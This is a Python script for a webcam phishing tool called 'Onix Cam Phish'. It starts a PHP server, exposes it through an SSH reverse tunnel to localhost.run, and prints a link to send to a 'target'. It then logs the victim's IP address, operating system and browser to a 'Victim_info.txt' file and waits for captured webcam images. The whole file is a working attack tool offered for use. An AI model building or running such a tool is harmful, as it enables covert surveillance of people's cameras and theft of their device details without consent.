from colorama import Fore , init ;init()
from pathlib import Path
from time import sleep
import pandas as pd
import subprocess
import linecache
import keyboard
import random
import json
import sys
import os

#====================================================================================================
def php_server():
    with open("Server" , "w") as log:
        subprocess.Popen((f"php -S localhost:{port}"),stderr=log,stdout=log , shell=True)
#====================================================================================================
def loaclhost():
    global port

    with open("localhost.txt" , "w") as local:
        subprocess.Popen((f"ssh -R 80:localhost:{port} nokey@localhost.run"),stderr=local , stdout=local , shell=True)
#====================================================================================================
if os.name == "posix":
    uid = os.getuid()
    if uid == 1000:
        exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Run with sudo command for running the localhost {Fore.GREEN}(sudo python Onix_cam_phish.py)""")
else:
    pass
#====================================================================================================
def Sprint(text):
  for character in text:
    sys.stdout.write(character)
    sys.stdout.flush()
    sleep(0.1)

#====================================================================================================

check = subprocess.call("php -v" , stdout=subprocess.DEVNULL , shell=True)

if check != 0:
    print(f"{Fore.RED}[-]{Fore.BLUE} Unfortunately you dont have PHP please install it and come back soon !")
    sys.exit()

#====================================================================================================
def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

clear()
sleep(0.1)

#Banner ====================================================================================================
Banner_color = (Fore.RED , Fore.MAGENTA , Fore.GREEN)


print(fr"""{random.choice(Banner_color)} 
                           
 ██████╗ ███╗   ██╗██╗██╗  ██╗     ██████╗ █████╗ ███╗   ███╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
██╔═══██╗████╗  ██║██║╚██╗██╔╝    ██╔════╝██╔══██╗████╗ ████║    ██╔══██╗██║  ██║██║██╔════╝██║  ██║
██║   ██║██╔██╗ ██║██║ ╚███╔╝     ██║     ███████║██╔████╔██║    ██████╔╝███████║██║███████╗███████║
██║   ██║██║╚██╗██║██║ ██╔██╗     ██║     ██╔══██║██║╚██╔╝██║    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║
╚██████╔╝██║ ╚████║██║██╔╝ ██╗    ╚██████╗██║  ██║██║ ╚═╝ ██║    ██║     ██║  ██║██║███████║██║  ██║
 ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                 
      {Fore.RESET}""")


#option 1 ====================================================================================================
def webcam():
    global port
#====================================================================================================
    try:
        port = int(input(Fore.MAGENTA + f"\r\nWhich Port Want To Open {Fore.GREEN}(Default 80){Fore.BLUE} : " + Fore.RESET))
    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
    except ValueError:
        exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
    if port > 65535:
        exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
#====================================================================================================
    php_server()
    
    sleep(1)

    loaclhost()

    sleep(10)

#====================================================================================================
    line = linecache.getline(r"localhost.txt" , 24)
    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
    linecache.clearcache()

    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n" + Fore.RESET)

#Write info====================================================================================================
    try:
        while True:
            size = os.stat("info.json")
            if size.st_size != 0:

                
                with open("info.json", "r") as read_file:
                    data = json.load(read_file)
                    
                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"  ])
                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                    
                    sleep(1)
                    df = pd.read_json(r"info.json")
                    sleep(1)
                    df.to_csv("Victim_info.txt", index=False , mode="a")

                    victim_file= open("Victim_info.txt", "a")
                    victim_file.write("\n")
                    sleep(3)
                    open("info.json" , "w").close()
                    victim_file.close()

                    Sprint(Fore.YELLOW + "\r\nWaiting for images...".title() + Fore.RESET)
                    break

    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")

#====================================================================================================
   
    while True:
        folder = sum([f.stat().st_size for f in Path("../images").glob("**/*")])
    
        if folder != 0:
           Sprint(Fore.GREEN + "\r\n\nI got the images , Check Images folder".title() + Fore.RESET)
           
           try:
            Sprint(Fore.YELLOW + "\r\npress ctrl + C for exit".title() + Fore.RESET)
            sleep(9*99999999)
           except KeyboardInterrupt:
            pass
            
           break

    if os.name == "nt":
        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    else:
        subprocess.call("sudo pkill php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()

if __name__ == "__main__":
    webcam()